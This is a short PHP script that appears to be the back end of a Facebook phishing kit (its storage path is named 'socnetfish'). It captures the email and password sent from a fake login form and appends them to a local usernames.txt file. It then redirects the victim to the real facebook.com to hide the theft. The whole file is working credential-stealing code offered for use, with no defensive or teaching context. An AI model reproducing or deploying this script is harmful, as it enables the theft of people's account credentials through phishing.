<?php
$usuario = exec('whoami');
file_put_contents("/home/". $usuario ."/.config/socnetfish/usernames.txt","\n" . "Facebook" . "\n"  . "Account: " . $_POST['email'] . " Pass: " . $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://facebook.com/');
exit();
?>
